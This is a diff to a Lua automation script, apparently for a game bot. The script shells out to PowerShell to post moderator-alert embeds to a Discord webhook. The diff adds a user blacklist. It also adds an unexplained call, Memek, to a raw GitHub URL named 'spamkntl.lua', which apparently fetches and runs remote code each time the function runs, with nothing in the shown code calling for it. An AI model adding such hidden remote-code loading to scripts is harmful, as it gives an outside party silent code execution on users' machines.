@@ -163,39 +163,50 @@ end
 end
 
 function ohdmod(logger)
-	
-    InfoBy = "\nInfo By <@" .. userdc .. ">"
-    TagRole = "<@&1057182557185257522>"
-    Warna = 16711680
-        
-    local script = [[
-        $w = "]]..modpek..[["
 
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Memek("https://raw.githubusercontent.com/ditampol-tzuyoon/jnck/main/spamkntl.lua")
 
-        [System.Collections.ArrayList]$embedArray = @()
-        $descriptions = ']].. logger ..[[ ]]..InfoBy..[['
-        $color       = ']]..Warna..[['
+    Kirim = true
+    for _, v in pairs(BlackList) do
+        if v == userdc then
+            Kirim = false
+        end
+    end
 
-        $embedObject = [PSCustomObject]@{
-            description = $descriptions
-            color       = $color
-        }
+    if Kirim then
+        InfoBy = "\nInfo By <@" .. userdc .. ">"
+        TagRole = "<@&1057182557185257522>"
+        Warna = 16711680
+            
+        local script = [[
+            $w = "]]..modpek..[["
 
-        $embedArray.Add($embedObject) | Out-Null
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-        $Body = [PSCustomObject]@{
-            embeds = $embedArray
-            'username' = 'ModsMmk | Od2320'
-            'content' = ']]..TagRole..[['
-        }
+            [System.Collections.ArrayList]$embedArray = @()
+            $descriptions = ']].. logger ..[[ ]]..InfoBy..[['
+            $color       = ']]..Warna..[['
 
-        Invoke-RestMethod -Uri $w -Body ($Body | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
-    ]]
+            $embedObject = [PSCustomObject]@{
+                description = $descriptions
+                color       = $color
+            }
 
-    local pipe = io.popen("powershell -command -", "w")
-    pipe:write(script)
-    pipe:close()
+            $embedArray.Add($embedObject) | Out-Null
+
+            $Body = [PSCustomObject]@{
+                embeds = $embedArray
+                'username' = 'ModsMmk | Od2320'
+                'content' = ']]..TagRole..[['
+            }
+
+            Invoke-RestMethod -Uri $w -Body ($Body | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+        ]]
+
+        local pipe = io.popen("powershell -command -", "w")
+        pipe:write(script)
+        pipe:close()
+    end
 end
 
 function odnotice(logger)
